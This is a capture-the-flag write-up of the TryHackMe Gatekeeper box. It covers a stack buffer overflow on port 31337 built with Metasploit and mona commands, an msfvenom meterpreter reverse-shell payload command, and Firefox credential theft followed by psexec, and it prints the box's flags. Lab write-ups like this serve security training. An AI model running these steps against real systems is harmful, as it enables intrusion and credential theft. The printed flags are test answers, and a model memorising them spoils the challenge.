---
title: TryHackMe Gatekeeper writeup
date: 2024-06-30 08:00:00 +/-0000
categories:
  - Writeups
tags:
  - ctf
  - writeup
  - offensive
---
![](/assets/img/all/Pasted image 20251106205226.png)

## Enumeration

![](/assets/img/all/Pasted image 20251106205306.png)

On port 31337 there was a program running that took user input. It crashed when providing a long string confirming it's vulnerable to buffer overflow

![](/assets/img/all/Pasted image 20251106205333.png)

I downloaded it via smb as guest login was enabled

![](/assets/img/all/Pasted image 20251106205401.png)
![](/assets/img/all/Pasted image 20251106205404.png)

## Exploitation

I copied the `gatekepper.exe` file to Windows machine with Immunity Debugger and started testing the program using scripts from https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst

First I created a unique pattern so that I could determine the offset of the EIP

```shell
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
```

After sending the payload I copied the value of EIP shown in the Immunity Debugger

![](/assets/img/all/Pasted image 20251106205817.png)

And ran the command

```shell
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 600 -q <address>
```

to find EIP offset and I updated the `offset` variable in the exploit script. Then I started looking for bad chars. First I ran a `mona` command in Immunity Debugger

```text
!mona bytearray -b "\x00"
```

I generated bad chard and copied them to the script

```python
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

After sending the exploit I copied the address of ESP and ran another `mona` command

```text
!mona compare -f C:\mona\gatekeeper\bytearray.bin -a <address>
```

![](/assets/img/all/Pasted image 20251106210243.png)

Then I generated a new bytearray in `mona`, specifying these new badchars along with \\x00 and removed them from the payload. After sending the updated exploit there are no more bad chars found

![](/assets/img/all/Pasted image 20251106210417.png)

The next step is to find a jump point

```text
!mona jmp -r esp -cpb "<bad chars>"
```

![](/assets/img/all/Pasted image 20251106210452.png)

I picked one of the addresses found and copied it to `retn` variable reversing the byte order because of the endianness of the system. Then I generated a payload with `msfvenom`

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "<bad chars>" -f c
```

and copied it to the `payload` variable. Finally I prepended at least 16 NOP bytes (\\x90) as padding. Final values looked like this

![](/assets/img/all/Pasted image 20251106210652.png)

I set up a listener in `metasploit`, ran the exploit and got the reverse shell

![](/assets/img/all/Pasted image 20251106210740.png)

## Privilege Escalation

While looking through the files I found `Firefox.lnk` file which indicated that Firefox was installed on the system. That plus the fact that the box description mentions 'fire' hinted that it might be an attack vector. I used Metasploit's `post/multi/gather/firefox_creds` module to retrieve credentials

![](/assets/img/all/Pasted image 20251106211013.png)

To decrypt the them I used (firefox_decrypt](https://github.com/unode/firefox_decrypt). I renamed the files, started the tool and got credentials

![](/assets/img/all/Pasted image 20251106211213.png)

To execute commands with these credentials I used `psexec`

![](/assets/img/all/Pasted image 20251106211935.png)

### Flags

`C:\Users\natbat\Desktop` 

{H4lf_W4y_Th3r3}

`C:\Users\mayor\Desktop`

{Th3_M4y0r_C0ngr4tul4t3s_U}